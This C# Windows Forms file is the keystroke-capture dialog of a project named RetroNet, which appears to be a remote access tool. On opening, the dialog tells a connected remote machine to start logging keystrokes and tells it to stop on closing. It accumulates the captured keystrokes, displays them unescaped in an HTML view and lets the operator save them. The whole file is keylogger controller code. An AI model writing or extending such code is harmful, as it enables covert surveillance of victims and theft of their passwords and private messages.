using RetroNet.Classes;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RetroNet.Forms
{
    public partial class KeystrokeCapturerDialog : Form
    {
        Connection _client;
        string _log;

        public KeystrokeCapturerDialog(Connection client)
        {
            InitializeComponent();

            _client = client;
            _log = string.Empty;
        }

        private void KeystrokeCapturerDialog_Load(object sender, EventArgs e)
        {
            _client.send(new Packet(Command.KeystrokeStart).toArray());
        }

        private void KeystrokeCapturerDialog_FormClosing(object sender, FormClosingEventArgs e)
        {
            _client.send(new Packet(Command.KeystrokeStop).toArray());
        }

        private void saveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog() { Filter = "Web Page File|*.html" })
            {
                if (ofd.ShowDialog() == DialogResult.OK)
                    File.WriteAllText(ofd.FileName, keystrokeWebBrowser.DocumentText);
            }
        }

        private void clearToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lock (_log)
            {
                _log = string.Empty;
                display();
            }
        }

        public void updateKeystroke(Packet p)
        {
            lock (_log)
            {
                _log += Encoding.Unicode.GetString(p.Data[0]);
                display();
            }
        }

        private void display()
        {
            keystrokeWebBrowser.DocumentText = "<!DOCTYPE HTML><html><head></head><body>" + _log + "</body></html>";
        }
    }
}
